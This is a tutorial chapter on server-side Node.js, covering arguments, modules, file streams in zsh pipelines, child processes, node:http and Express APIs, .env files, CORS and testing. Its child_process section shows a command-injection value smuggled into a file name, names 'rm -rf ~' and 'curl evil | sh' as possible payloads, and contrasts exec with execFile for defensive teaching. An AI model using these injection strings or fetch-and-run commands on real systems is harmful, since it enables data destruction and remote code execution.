title: Node.js: JavaScript on the Server
sub: Run JavaScript outside the browser: scripts in zsh pipelines, files and processes, a web server from scratch, npm, Express and tests
goals: Install a current Node LTS on the Mac and use the REPL, scripts, arguments, environment variables and exit codes
Tell ES modules from CommonJS and fix the errors each one produces
Read and write files, stream a log through a Node script inside a zsh pipeline, and run other programs without shell injection
Build a JSON API on node:http, then rebuild it with Express middleware
Manage packages and scripts with npm, and read semver ranges and the lockfile
Configure a server with .env, answer CORS preflights, debug with --inspect and test with node --test

blocks.text: The JavaScript you wrote in the browser chapters ran inside a page, with a DOM and a sandbox around it. Node.js takes the same language and the same engine, removes the page, and gives you the operating system instead: files, processes, sockets, environment variables, exit codes. In this chapter you will use Node as a scripting tool that sits in zsh pipelines like `awk` does, then build a JSON API twice, first on the bare `node:http` module and then with Express, and finish with the tooling that keeps a server project healthy: npm, `.env` files, CORS, the inspector and the built-in test runner. Every server below was started for real, and every transcript is what `curl` printed.

`mkdir -p ~/lab/node && cd ~/lab/node`, and keep every file from this chapter there. Open the folder in VS Code or PyCharm (since 2026.1 the free PyCharm tier edits JavaScript well; Node.js run configurations and the debugger need the Pro subscription). Keep one Terminal tab for servers and one for `curl`, as in the loopback lab of [Python for networking](#py-net).
What Node is

Node is a program, written mostly in C++, that embeds Google's **V8** JavaScript engine (the one in Chrome) and adds two things a browser engine lacks: an **event loop with asynchronous I/O**, provided by the C library **libuv**, and a **standard library** of modules for files, networking, processes and streams. There is no `window`, no `document`, no DOM. There is `process`, `Buffer`, `require` (in CommonJS files) and a module per subsystem, named with the `node:` prefix.

blocks.text: The concurrency model is the one you met in [JavaScript in depth](#js-deeper): **one thread runs your JavaScript**, and everything slow (a socket read, a file read, a timer) is started, handed to the operating system or to libuv's small thread pool (4 threads by default), and finished later by a callback that the event loop runs when the call stack is empty. A Node web server handles thousands of idle connections on one thread because waiting costs nothing. The price is the same as in the browser: a CPU-heavy loop blocks every request until it ends.

Installing Node on your Mac

Up to Node 26, a new major version shipped every six months: **even-numbered** majors became **LTS** (long-term support) in October and got about 30 months of fixes, and odd-numbered ones lived for a few months. From Node 27 the cycle is annual and every major becomes LTS after six months as Current. As of November 2026, according to nodejs.org: Node **26** ("Lithium") became the Active LTS line on 28 October 2026, Node **24** ("Krypton") and Node **22** ("Jod") are in maintenance, and Node 20 is end-of-life. Check nodejs.org for the state on the day you read this, and use an LTS line for anything you want to keep running.

Arguments, environment and exit codes

A command-line tool needs four things from its process: arguments, environment variables, a way to report errors, and an exit status. `process.argv` is an array: the path of the `node` binary, the path of the script, then your arguments as strings. `util.parseArgs` turns them into options without a dependency.
The `import` line works because `~/lab/node` will be an ES-module package. Make it one now (the next section explains why):

blocks.code: cd ~/lab/node && npm init -y && npm pkg set type=module

$ node args.js 192.168.1.1 192.168.1.50 -t 500 -v; echo "status $?"
raw: [ '192.168.1.1', '192.168.1.50', '-t', '500', '-v' ]
parsed: [Object: null prototype] { timeout: '500', verbose: true } [ '192.168.1.1', '192.168.1.50' ]
you will probe 192.168.1.1, 192.168.1.50 with a 500 ms timeout
status 0
$ node args.js; echo "status $?"
raw: []
parsed: [Object: null prototype] { timeout: '1000', verbose: false } []
usage: node args.js HOST... [-t ms] [-v]
status 2
$ node args.js --port 80 2>&1 | grep '^TypeError'
TypeError [ERR_PARSE_ARGS_UNKNOWN_OPTION]: Unknown option '--port'. To specify a positional argument starting with a '-', place it at the end of the command after '--', as in '-- "--port"
$ PORT=8080 node -p 'process.env.PORT'

blocks.text: Option values arrive as strings (`'500'`), so convert them. The usage message went to **stderr** with status 2, so `node args.js || echo failed` works in zsh. An unknown option throws, and an uncaught exception prints the stack and exits with status 1. `PORT=8080 node ...` sets a variable for one command, as for any program.

`process.exit(2)` stops the process immediately, even if output written with `process.stdout.write` to a pipe has not been flushed yet. Setting `process.exitCode = 2` and letting the program end naturally always delivers everything. Use `process.exit()` only when you must stop at once.

blocks.sum: The command-line arguments of the running process, as an array of strings.

how.text: Element 0 is the absolute path of the `node` binary, element 1 the absolute path of the script, and the rest are the words zsh passed after it, already split and unquoted by the shell. Nothing is parsed: `-t 500` is two strings. Slice off the first two and parse the rest yourself or with `util.parseArgs`.

blocks.name: util.parseArgs()
blocks.sum: Parse short and long options plus positional arguments from process.argv, with no dependency.
blocks.syntax: parseArgs({ options: { name: { type: 'string'|'boolean', short, default, multiple } }, allowPositionals }) → { values, positionals }

blocks.name: process.env
blocks.sum: The environment variables of the process, as an object of strings.

how.text: Node copies the environment it was started with into `process.env`. Every value is a string, so `process.env.PORT` is `'8080'`, and a missing variable is `undefined`. blocks.name: process.exitCode
blocks.sum: The exit status the process will report to the shell when it ends naturally.

how.text: Zero means success; anything else is failure, exactly as in [Pipes](#pipes/control). Setting `process.exitCode` lets pending output and cleanup finish; `process.exit(code)` ends the process at once. An uncaught exception or an unhandled promise rejection exits with status 1.

blocks.name: process.stdout.write()
blocks.sum: Write text to standard output exactly as given, without the newline and formatting console.log adds.
blocks.syntax: process.stdout.write(string | Buffer) → boolean      console.error(...) writes to stderr

how.text: `process.stdout` is a Writable stream on file descriptor 1. `console.log(x)` formats `x` with `util.inspect` and adds a newline; `write` sends your bytes as they are, which is what you want for machine-readable output such as TSV lines. blocks.text: Modules: ES modules and CommonJS

Node has two module systems, and you will meet both. **CommonJS** (CJS) is Node's original: `require()` loads a file synchronously and returns its `module.exports`. **ES modules** (ESM) are the standard from [JavaScript in depth](#js-deeper): `import` and `export`, loaded asynchronously, with top-level `await`, the same syntax the browser runs. New code should be ESM. Old tutorials, many config files and some packages are still CJS.

Node looks up the **nearest** `package.json` above the file. That is why you ran `npm pkg set type=module`: every `.js` file in `~/lab/node` is now an ES module, and a file that must stay CommonJS gets the `.cjs` extension.

   ├── import legacy from ⟪y:'./legacy.cjs'⟫                         CJS: module.exports becomes the default
   └── import { readFile } from ⟪g:'node:fs/promises'⟫                 built-in, never on disk, never shadowed

blocks.code:
$ echo "const fs = require('node:fs');" > oops.js && node oops.js
file:///Users/you/lab/node/oops.js:1
const fs = require('node:fs');
           ^

ReferenceError: require is not defined in ES module scope, you can use import instead
This file is being treated as an ES module because it has a '.js' file extension and '/Users/you/lab/node/package.json' contains "type": "module". To treat it as a CommonJS script, rename it to use the '.cjs' file extension.
$ echo "console.log(__dirname);" > oops.js && node oops.js 2>&1 | grep Error
ReferenceError: __dirname is not defined in ES module scope
$ rm oops.js

blocks.text: The message names both fixes: use `import`, or rename to `.cjs`. In ESM, `__dirname` becomes `import.meta.dirname` (Node 20.11+), and `new URL('./file', import.meta.url)` builds a path relative to the module itself.

Node 22.7 and later detect ESM syntax in a `.js` file even without `"type": "module"`, re-parse it as ESM and run it. If a `package.json` without a `type` field is nearby, they also print `Warning: Module type of file:///... is not specified and it doesn't parse as CommonJS. Reparsing as ES module because module syntax was detected.` The warning is the fix request: add `"type": "module"`. Relying on detection costs a second parse and confuses tools.

Since Node 22.12, a CommonJS file can also `require()` an ES module that has no top-level `await`, which ends most interop pain. The other direction always worked: `import` loads CommonJS, and `module.exports` becomes the default export.

blocks.name: import (Node ESM)
blocks.sum: Load an ES module, a CommonJS module, a built-in or an npm package in an ES-module file.
blocks.syntax: import def, { named } from 'specifier'      const mod = await import('specifier')

how.text: Node resolves the specifier in three ways. `node:fs` is a built-in. `./x.js` or `../lib/x.js` is a file relative to the importing module, and the extension is mandatory (no guessing `index.js` as CommonJS does). A bare name such as `express` is a package looked up in `node_modules` folders, walking up from the importing file. All static imports are resolved and loaded before the module body runs, which is why top-level `await` is allowed. `import()` loads on demand and returns a promise.

blocks.name: require()
blocks.sum: Load a CommonJS module synchronously and return its module.exports.

how.text: `require` resolves the path (trying `.js`, `.json`, `.node` and `index.js` when you leave the extension off), runs the file once inside a function wrapper that provides `require`, `module`, `exports`, `__filename` and `__dirname`, caches the result, and returns `module.exports`. Every later `require` of the same file returns the cached object. It exists only in CommonJS files; in an ES module, use `import`, or create one with `createRequire(import.meta.url)` from `node:module`.

blocks.text: Files, paths and the operating system

The `node:fs` module comes in three flavours: callbacks (`fs.readFile(path, cb)`), synchronous (`fs.readFileSync`) and promises (`node:fs/promises`). Use the promise API with `await` in new code. Use the `Sync` versions only in short scripts or at startup, because they block the event loop, and in a server that blocks every client. Paths are built with `node:path`, never with string concatenation.

blocks.name: fs.writeFile()
blocks.sum: Create a file or replace its contents with a string or Buffer.

how.text: Opens the file for writing (creating it, truncating it), writes everything, closes it. The parent folder must exist (`mkdir` first). A crash halfway leaves a truncated file, so data you cannot lose is written to a temporary file and then `rename`d over the original, which is atomic on the same volume: readers see the old file or the new one, never half of one. The capstone's store does exactly that.

blocks.name: fs.stat()
blocks.sum: Get size, timestamps, permissions and type of a file or directory.
blocks.syntax: const info = await stat(path)    info.size  info.mtime  info.isFile()  info.mode

how.text: Wraps the `stat(2)` system call, the same data `stat -f` and `ls -l` show. `size` is in bytes, `mtime` a `Date`, `mode` the permission bits (`(info.mode & 0o777).toString(8)` gives `'644'`). `lstat` reports on a symlink itself instead of its target. A missing path rejects with `ENOENT`, which makes `stat` the usual "does it exist" test.

blocks.name: path.join()
blocks.sum: Join path segments with the right separator and normalise . and .. (path.resolve makes the result absolute).
blocks.syntax: path.join(...segments)    path.resolve(...segments)    path.basename(p, ext)    path.extname(p)    path.relative(from, to)

how.text: `join` concatenates with `/`, collapses duplicate slashes and resolves `.` and `..` textually, without touching the disk. `resolve` works right to left until it has an absolute path, prefixing `process.cwd()` if needed. Because `..` is resolved, joining user input onto a base folder can climb out of it: `path.join('/srv/public', '../app.js')` is `/srv/app.js`. blocks.text: Events, streams and Node in a zsh pipeline

Two ideas run through the whole standard library. An **EventEmitter** is an object you can subscribe to by event name: servers emit `'request'`, sockets emit `'data'` and `'close'`, processes emit `'exit'`. A **stream** is an EventEmitter that moves data in chunks: Readable (files you read, `process.stdin`, an incoming HTTP request), Writable (`process.stdout`, a file you write, an HTTP response), and Transform (gzip, line splitting) in between.

blocks.code:
$ node emitter.js; echo "status $?"
before
result 192.168.1.1 up
result 192.168.1.60 DOWN
ALERT first outage: 192.168.1.60
result 192.168.1.70 DOWN
after; down listeners left: 0
file:///Users/you/lab/node/emitter.js:21
monitor.emit('error', new Error('probe socket failed')); // nobody listens for 'error'
                      ^

Error: probe socket failed
    at file:///Users/you/lab/node/emitter.js:21:23
Emitted 'error' event on Monitor instance at:
    at file:///Users/you/lab/node/emitter.js:21:9
status 1

blocks.text: Three facts are visible. `emit` is **synchronous**: every listener ran before `report` returned, between `before` and `after`. `once` removed itself after one call. And `'error'` is special: emitting it with no listener **throws**, which crashes the process. Every socket, stream and server you create can emit `'error'`, so attach a listener or the first network hiccup kills your program.

blocks.name: EventEmitter
blocks.sum: Base class for objects that emit named events to registered listener functions.
blocks.syntax: emitter.on(name, fn)  emitter.once(name, fn)  emitter.off(name, fn)  emitter.emit(name, ...args)  await once(emitter, name)

how.text: An emitter keeps a map from event name to an array of listeners. `emit` calls them synchronously, in order, with the arguments you pass, and returns whether there were any. More than 10 listeners for one event prints a possible-leak warning, because adding a listener per request and never removing it is a classic memory leak.

blocks.text: A Node script in a shell pipeline

`process.stdin` is a Readable stream, so a Node script can sit in the middle of a zsh pipeline exactly like `awk` in [Pipes](#pipes). Data arrives in chunks of arbitrary size (often 64 KB), which can cut a line in half; `readline` reassembles them into whole lines, and `for await` consumes them one at a time.

cat access.log ──▶ ║pipe║ ──▶ ⟪c:process.stdin⟫ ──▶ ⟪c:readline⟫ ──▶ your loop ──▶ ⟪g:process.stdout⟫ ──▶ ║pipe║ ──▶ sort, head
                              Readable, chunks     whole lines                Writable
                                                       console.error ──▶ ⟪r:stderr⟫ ──▶ terminal

$ node codes.js < ~/lab/access.log
200	57
301	14
401	12
404	11
304	10
403	8
302	6
500	2
$ printf 'garbage line\n' | cat ~/lab/access.log - | node codes.js | sort -n | head -3

200	57
301	14

blocks.text: The `skipping:` line went to stderr, so it reached the terminal and stayed out of `sort`. Now remove the `process.stdout.on('error', ...)` block and pipe into `head -1`:

blocks.code:
$ cat ~/lab/access.log | node codes.js | head -1
200	57
node:events:497
      throw er; // Unhandled 'error' event
      ^

Error: write EPIPE

blocks.text: `head` exits after one line and closes the pipe. The next `write` fails with **EPIPE** (broken pipe), the stream emits `'error'`, nobody listens, and Node crashes. Classic Unix tools die silently from `SIGPIPE`; Node ignores that signal and reports the error, so a filter script handles `EPIPE` and exits 0. The crash depends on timing, which is why the handler belongs in every filter.
Streams between files: pipeline()

`pipeline` connects streams the way `|` connects processes, forwards errors from any stage, and cleans every stream up when one fails. It also applies **back-pressure**: when the writer is slow, the reader pauses, so memory use stays flat whatever the file size.

blocks.name: readline.createInterface()
blocks.sum: Split a Readable stream (stdin, a file) into whole lines you can loop over.
blocks.syntax: for await (const line of readline.createInterface({ input, crlfDelay: Infinity })) { ... }

how.text: Buffers incoming chunks, cuts them at newlines and emits one `'line'` event per line, without the newline; the interface is also async-iterable, so `for await` reads one line at a time and pauses the input while your loop body runs. `crlfDelay: Infinity` treats `\r\n` as one line break even when the two bytes arrive in different chunks, which matters for logs from Windows or network devices.

blocks.name: fs.createReadStream()
blocks.sum: Open a file as a Readable stream that delivers it in chunks (64 KB by default).
blocks.syntax: createReadStream(path, { encoding, start, end, highWaterMark })      // from 'node:fs'

how.text: Opens the file and reads it chunk by chunk as the consumer asks for data, so memory stays at one chunk however big the file is. `start` and `end` (byte offsets, inclusive) read a slice, which is how a server answers a `Range` request. blocks.text: Running other programs: node:child_process
Sometimes the right tool already exists (`ping`, `dig`, `git`, `networksetup`). `node:child_process` starts it. There are two families, and the difference is security, not convenience.

blocks.code:
$ cd ~/lab
$ node node/lines.js access.log
exec:     120 access.log
execFile: 120 access.log
$ node node/lines.js 'access.log; echo INJECTED > owned.txt'
exec:     120 access.log
execFile: wc exited with 1 (no such file, nothing else ran)
$ cat owned.txt
INJECTED
$ rm owned.txt

blocks.text: With `exec`, the "file name" was shell code: `/bin/sh` saw a `;`, ran `wc`, then ran the attacker's command. Replace `echo INJECTED` with `rm -rf ~` or `curl evil | sh` and you see the stakes. With `execFile`, the whole string was one argument to `wc`, which simply found no such file. This is **shell injection**, the same bug as `subprocess.run(..., shell=True)` in [Python files and pipelines](#py-files), and the rule is the same: pass an argument array and never build a command string from data.

blocks.title: Data never goes into a command string

blocks.text: Any value that came from a user, a file, a URL or an HTTP request goes to `execFile` or `spawn` as an element of the argument array. If you need shell features (pipes, globs), do them in Node instead (`pipeline`, `readdir`), or validate the value against a strict pattern first, such as an IPv4 regex for a host.

blocks.name: child_process.execFile()
blocks.sum: Run a program with an argument array, no shell, and collect its stdout and stderr.
blocks.syntax: execFile(file, args, { timeout, maxBuffer, cwd, env }, callback)      const { stdout } = await promisify(execFile)(file, args)

how.text: Node forks and executes `file` directly, looking it up on `PATH`, with `args` as the exact argument vector. No shell parses anything, so spaces, quotes, `;` and `$()` in an argument are just characters. Output is buffered in memory (1 MB `maxBuffer` by default) and handed over when the process exits; a non-zero exit status rejects the promise with `err.code` set to that status, and `timeout` kills a hung child.

gotchas: `execFile` cannot run shell syntax: `execFile('ls *.log')` looks for a program literally named `ls *.log`.

blocks.name: child_process.exec()
blocks.sum: Run a command string through /bin/sh and collect its output; never with untrusted data.
blocks.syntax: exec(command, { timeout, cwd }, callback)      const { stdout } = await promisify(exec)(command)

how.text: Spawns `/bin/sh -c command`, so the string can use pipes, globs, redirection and variables. That power is the danger: anything interpolated into the string is parsed as shell code. Use it only for fixed strings you wrote yourself.

blocks.sum: Start a program and talk to it through streams, for long-running or large-output processes.
blocks.syntax: const child = spawn(cmd, args, { stdio, cwd, env })    child.stdout.on('data')    child.on('close', (code) => ...)

blocks.text: A web server from scratch with node:http

`node:http` is a complete HTTP/1.1 server with no framework on top. You give `http.createServer` one function, and Node calls it for every request with two objects: `req` (an `IncomingMessage`: a Readable stream with `method`, `url` and `headers`) and `res` (a `ServerResponse`: a Writable stream with `writeHead`, `write` and `end`). Routing, body parsing, JSON and static files are your job. Doing that once is the best way to understand what Express does for you later.

items.text: **Every path ends in `res.end()`**, errors included. The outer `.catch` turns a bug into a logged 500 instead of a hung client or a crash.
**Bodies are streams with a size limit.** Without `MAX_BODY`, a client can fill your memory.

blocks.sum: Create an HTTP server that calls your handler with a request and a response object for every request.

how.text: Returns an `http.Server` (a `net.Server` with the llhttp parser on top). blocks.name: response.writeHead()
blocks.sum: Send the status line and headers of an HTTP response in one call.

how.text: Headers must go out before the body, so `writeHead` (or the first `write`) commits them; setting a header afterwards throws `ERR_HTTP_HEADERS_SENT`. `res.end(body)` writes the last chunk and finishes the response. Without `Content-Length`, Node uses chunked transfer encoding, which works but prevents the client from showing progress. For `HEAD` requests Node sends the headers and drops the body for you.

blocks.name: server.listen()
blocks.sum: Bind a server to a port and address and start accepting connections.

how.text: Creates the listening socket with `bind(2)` and `listen(2)`. The host decides who can connect: `127.0.0.1` only this Mac, `0.0.0.0` every IPv4 interface, so other devices on your LAN. Port `0` asks the kernel for any free port, which tests use to avoid collisions; read it back from `server.address().port` once `'listening'` fires. blocks.text: Express: routing and middleware

Express is the most used Node web framework, and its core idea is small: a request travels through a list of **middleware** functions `(req, res, next)`. Each one may end the response (`res.json(...)`) or call `next()` to pass the request on. Routes are middleware that only run for one method and path. Error handlers are middleware with **four** parameters, and they only run when something called `next(err)` or threw.

blocks.code:
request ─▶ [logger] ─next()─▶ [cors] ─next()─▶ [static] ─next()─▶ [json parser] ─next()─▶ [routes] ─▶ res.json()
               │                  │ OPTIONS: 204      │ file exists: send it           │ no match
               │                  ▼                   ▼                                ▼
               │               (done)              (done)                        [404 handler]
               └──── throw / next(err) / rejected promise ──────────────────────────▶ [error handler (err, req, res, next)]

blocks.text: The loop that drives it fits in 25 lines. This model skips routing, but the skip-and-continue logic is the real one:

blocks.out:
1 logger GET /api/status
2 route: send JSON
1 logger GET /boom
3 error handler: kaboom
1 logger GET /nope
end of stack: 404

blocks.text: Delete `next();` from the logger and run it again: every request stops after line 1. In a real server that means a client that waits until it times out, the most common Express bug.

tokens.exp: register a handler for GET requests only
path pattern; :port captures one segment into req.params.port (a string)
the handler: Node's request and response plus Express helpers
set the status, then send JSON with the right headers
end of the call; routes run in the order they were added

blocks.text: The same server in Express
Install Express 5 (`npm install express`; version 5 has been the default on npm since 2025 and needs Node 18 or later) and rebuild `app.js`, plus CORS and two new routes:

blocks.code:
$ curl -i http://localhost:3000/api/status HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 53 ETag: W/"35-ZHttEot7fm8iHDgDCv3BZshyueo" Date: Sun, 25 Oct 2026 04:58:29 GMT Connection: keep-alive Keep-Alive: timeout=5 {"host":"macbook.local","uptime":1,"node":"v22.22.0"} $ curl -s http://localhost:3000/api/ports/22; echo; curl -s http://localhost:3000/api/ports/70000 {"port":22,"service":"ssh"} {"error":"port must be 1-65535"} $ curl -s -X POST http://localhost:3000/api/echo -H 'Content-Type: application/json' -d '{"name":' {"error":"body must be JSON"} $ curl -s 'http://localhost:3000/api/log?lines=2' 185.220.101.4 - - [07/Oct/2026:10:13:24 +0000] "GET /admin HTTP/1.1" 401 454 "-" "python-requests/2.31.0" 172.16.5.9 - - [07/Oct/2026:10:13:27 +0000] "GET / HTTP/1.1" 200 32701 "-" "python-requests/2.31.0" $ curl -s http://localhost:3000/api/nope {"error":"no route for GET /api/nope"} $ curl -s http://localhost:3000/nope.html Error 
Cannot GET /nope.html

blocks.text: Compared with the hand-written version, Express added an `ETag` (browsers revalidate and get a 304), static files with `Last-Modified`, ranges and traversal protection, `res.json` with the right type and byte length, parsed `req.query` and `req.params`, and one error funnel. The `/api/log` route also shows **Express 5's async support**: when `readFile` rejects (rename `~/lab/access.log` and retry), the rejection goes to the error handler, which answers `500 {"error":"internal server error"}` and logs `Error: ENOENT: no such file or directory, open '/Users/you/lab/access.log'` in the server tab. Express 4 did not catch rejected promises: the request hung, or the unhandled rejection crashed the whole process.

blocks.title: Express 5 hands listen errors to your callback

blocks.text: In Express 5, `app.listen(port, host, cb)` registers `cb` for the `'error'` event as well. A callback written as `() => console.log('listening')` therefore prints "listening" when the port is taken, and the process exits with status 0 because nothing is listening. Take the error parameter, as above: the second copy then prints `cannot listen: listen EADDRINUSE: address already in use 127.0.0.1:3000` and exits 1.

blocks.name: express()
blocks.sum: Create an Express application: a request handler function with a middleware stack and routing methods.
blocks.syntax: import express from 'express'; const app = express(); app.listen(port, host, (err) => {...})

how.text: The returned `app` is itself a function `(req, res)` you could pass to `http.createServer(app)`, which is what `app.listen` does internally (and what the capstone does, so tests can control the server). `req` and `res` are the Node objects with extra methods: `req.params`, `req.query`, `req.body`, `req.get()`, `req.is()`, `res.status()`, `res.json()`, `res.send()`, `res.set()`, `res.type()`, `res.location()`, `res.sendStatus()`.

blocks.name: app.use()
blocks.sum: Add middleware that runs for every request, or for every request under a path prefix.
blocks.syntax: app.use([path,] (req, res, next) => {...})      app.use((err, req, res, next) => {...})

how.text: Middleware runs in the order you register it. Each call either ends the response or calls `next()`. With a path (`app.use('/api', fn)`), it runs for that prefix and everything below it. A function with four parameters is an error handler: skipped normally, called when an earlier layer threw, called `next(err)`, or (Express 5) returned a rejected promise.

blocks.name: app.get()
blocks.sum: Register a route handler for one HTTP method and path pattern (also post, put, patch, delete, all).

how.text: The path is matched against `req.path`; `:name` captures one segment into `req.params.name` as a string, so convert numbers yourself. Several handlers can be chained (validation, then the action). `express.Router()` groups routes under a prefix, as the capstone does with `app.use('/api', api)`. Express 5 changed wildcard syntax: `*` alone is gone, write `/*splat`.

blocks.name: express.json()
blocks.sum: Middleware that parses JSON request bodies into req.body.

how.text: For requests whose `Content-Type` is `application/json`, it reads the body stream (refusing more than `limit`, 100 kB by default, with a 413), parses it and stores the result in `req.body`. Other content types are left alone, and in Express 5 `req.body` then stays `undefined`. Malformed JSON becomes an error with `status 400` and `type: 'entity.parse.failed'`, delivered to your error handler.

blocks.name: express.static()
blocks.sum: Middleware that serves files from a folder, with content types, caching headers and traversal protection.

how.text: For GET and HEAD requests it maps the URL path onto the folder, refuses paths that escape it, sets `Content-Type` from the extension plus `ETag`, `Last-Modified` and `Accept-Ranges`, and streams the file. If no file matches it calls `next()`, so your routes still run. Dotfiles such as `.env` are ignored by default. Give it an absolute path (from `import.meta.dirname`), or it depends on the folder you started from.

blocks.name: Express error handler
blocks.sum: Middleware with four parameters that receives errors from any earlier layer and sends one consistent response.
blocks.syntax: app.use((err, req, res, next) => { res.status(500).json({ error: '...' }); })

how.text: Express recognises error handlers by `fn.length === 4`, so keep all four parameters even if `next` is unused. Register it last. Map known error types to client errors (`entity.parse.failed` to 400, `entity.too.large` to 413) and everything else to 500, logging the stack on the server and sending no internal details to the client. With `NODE_ENV=production`, Express's built-in fallback also hides stack traces.

blocks.text: Configuration: environment variables and .env

Configuration that differs between machines (port, bind address, data folder, API tokens) belongs in environment variables, read through `process.env`. Typing them before every command gets old, so projects keep them in a `.env` file, and Node reads it natively: `--env-file` since Node 20.6 and `process.loadEnvFile()` since 20.12, so the old `dotenv` package is no longer needed.

blocks.code:
$ printf 'PORT=8080\n# comments are allowed\nLAB_TOKEN=change-me\n' > .env
$ node --env-file=.env express-server.js
listening on http://127.0.0.1:8080
$ node --env-file=.env -p 'process.env.LAB_TOKEN'
change-me
$ node -p 'process.loadEnvFile(); process.env.PORT'
8080
$ node --env-file=missing.env -p 1; echo "status $?"
node: missing.env: not found
status 9

blocks.text: Variables already set in the real environment win over the file, so `PORT=9000 node --env-file=.env ...` uses 9000. `--env-file-if-exists=.env` (Node 22.9+) tolerates a missing file; in code, wrap `process.loadEnvFile()` in `try` and ignore `ENOENT`, as the capstone's `server.js` does.

blocks.title: .env stays out of git and out of the browser

blocks.text: Add `.env` to `.gitignore` before the first commit, and commit a `.env.example` with dummy values instead. Anything a browser downloads (every file in `public/`, every JavaScript bundle) is public: a token there is readable in DevTools by anyone who opens the page. Secrets stay on the server, which uses them on the client's behalf.

blocks.name: node --env-file
blocks.sum: Load KEY=value lines from a file into process.env before the script starts (process.loadEnvFile() does it from code).

how.text: Lines are `KEY=value`; `#` starts a comment; values may be quoted. Existing environment variables are not overwritten. A missing file is a fatal error (exit status 9) with the flag, and an `ENOENT` exception from `process.loadEnvFile()`. Several `--env-file` flags may be given; later files override earlier ones.

blocks.text: CORS from the server's side

In [How the web works](#web-intro) you met the **same-origin policy**: a page from `http://localhost:8000` may send a request to `http://localhost:3000` (a different port is a different origin), but the browser will not let the page's JavaScript **read** the response unless the server says it may, with `Access-Control-Allow-Origin`. CORS is enforced by browsers only. `curl`, Python and Node's `fetch` ignore it, which is why an API "works in curl but not in the page".

For requests that could change data or use non-simple headers (a `PUT`, a `DELETE`, a `POST` with `Content-Type: application/json`), the browser first sends a **preflight**: an `OPTIONS` request asking permission. The CORS middleware in `express-server.js` answers both kinds:

blocks.code:
$ curl -si -X OPTIONS http://localhost:3000/api/echo -H 'Origin: http://localhost:8000' \
    -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: content-type'
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Origin: http://localhost:8000
Vary: Origin
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Max-Age: 600
ETag: W/"a-bAsFyilMr4Ra1hIU5PyoyFRunpI"
Date: Sun, 25 Oct 2026 04:58:29 GMT
Connection: keep-alive
Keep-Alive: timeout=5

$ curl -si http://localhost:3000/api/status -H 'Origin: http://evil.example' | grep -c Access-Control
0

page at http://localhost:8000                        API at http://localhost:3000
   fetch('/api/echo', POST, JSON) ──OPTIONS /api/echo──────────────▶  preflight: may I?
                                   Origin, Access-Control-Request-*
                                 ◀──204 Allow-Origin, Allow-Methods, Max-Age──
   (browser caches the answer 600 s)
                                 ───POST /api/echo + Origin──────────▶  the real request
                                 ◀──200 + Access-Control-Allow-Origin──  JS may read the body
   origin not allowed: the request may still reach the server, but JS gets "TypeError: Failed to fetch"

blocks.text: CORS is **not authentication**: anyone with `curl` can still call your API. `Access-Control-Allow-Origin: *` suits public read-only data; for an API that changes things, list the origins you serve. A page and API from the same server, as in the capstone, need no CORS headers at all.

The playground below has the two practice hosts from earlier chapters: `cors.example` sends the header, `nocors.example` does not. Click both buttons and compare the Console with the response headers in the Network pane.

blocks.code:
Same data, two hosts. Only one sends Access-Control-Allow-Origin.


--- js
const out = document.querySelector('#out');
async function load(host) {
  try {
    const res = await fetch(`https://${host}/api/status`);
    const data = await res.json();
    out.textContent = `${host}: ${res.status}, ${data.devices} devices`;
  } catch (err) {
    out.textContent = `${host}: ${err.name}: ${err.message}`;
  }
}
document.querySelector('#ok').addEventListener('click', () => load('cors.example'));
document.querySelector('#blocked').addEventListener('click', () => load('nocors.example'));

blocks.name: Access-Control-Allow-Origin
blocks.sum: Response header that tells a browser which page origin may read the response.
blocks.syntax: Access-Control-Allow-Origin: https://dashboard.example | *      (+ Vary: Origin when it depends on the request)

how.text: The browser compares the page's origin with this header after the response arrives; on a mismatch it hides the response from JavaScript and `fetch` rejects with `TypeError: Failed to fetch`. Preflighted requests also need `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` on the `OPTIONS` answer, and `Access-Control-Max-Age` lets the browser cache that permission. Cookies or HTTP auth additionally need `Access-Control-Allow-Credentials: true`, and then `*` is not allowed. When the value is chosen per request, send `Vary: Origin` so caches keep the variants apart.

blocks.text: Testing with node:test, and fetch in Node

Node ships a test runner (`node:test`) and an assertion library (`node:assert`), so a project needs no test framework. `node --test` finds files named like `*.test.js`, `*-test.js`, `test-*.js` or anything under a `test/` folder, runs each in its own process and reports. An HTTP server is tested the honest way: start it on port 0, talk to it with `fetch`, close it.

`fetch` is global in Node since version 18 (stable since 21) and is the same WHATWG API as in the browser, minus the browser's rules: no CORS, no cookie jar, any header allowed. Here it runs against the practice server:

blocks.name: fetch() (Node)
blocks.sum: The browser's fetch API, built into Node: send HTTP requests and read responses with promises.
blocks.syntax: const res = await fetch(url, { method, headers, body, signal })    res.ok  res.status  res.headers.get()  await res.json()

how.text: Node's `fetch` is implemented by the undici HTTP client. It resolves as soon as the status and headers arrive, and the body is read with `res.json()`, `res.text()` or as a stream (`res.body`). HTTP errors (404, 500) do **not** reject; only network failures and aborts do, so check `res.ok`. Pass `AbortSignal.timeout(ms)` as `signal` for a deadline. Connections are kept alive and reused between calls to the same host.

blocks.title: The core of a top-talkers tool

task.text: Write `topClients(text, n)`. `text` is a web log (combined format, one request per line, the client IP is the first field). Return an array of `[ip, count]` pairs, busiest first, at most `n` of them. Break ties by IP in ascending string order, and ignore blank lines. The starter prints the result for a five-line sample.

hints: Split the text on newlines, take everything before the first space, and count with a `Map`.
`[...map]` turns a Map into `[key, value]` pairs; sort with `(a, b) => b[1] - a[1] || a[0].localeCompare(b[0])`.

why.text: The Map keeps one counter per key in insertion order, and the comparator sorts by count first and falls back to the IP only when counts tie, because `0 || x` evaluates to `x`. This pure function is the part worth testing; the next exercise wraps it in stdin and stdout.

blocks.title: top.js in a zsh pipeline

task.text: Turn the previous function into `top.js`: it reads a log on **stdin**, takes an optional count argument (default 10), and prints `count ip` lines right-aligned like `uniq -c`. Use `express.json()`, `req.params`, `req.query`, `res.status().location().json()`, a JSON 404 handler and an error handler that turns `entity.parse.failed` into 400. blocks.title: Break it: forget express.json()

task.text: In `devices-express.js`, comment out `app.use(express.json());`, restart, and POST a valid device with curl. Read the HTTP status, then read the server tab. Restore the line. Then remove the 415 guard instead and POST a form body (`curl -d 'name=pi&ip=192.168.1.50'`). Explain both failures in one sentence each.

hints: Look for the word `undefined` in the server's stack trace.
blocks.solution:
sed -i '' 's|^app.use(express.json());|// app.use(express.json());|' devices-express.js
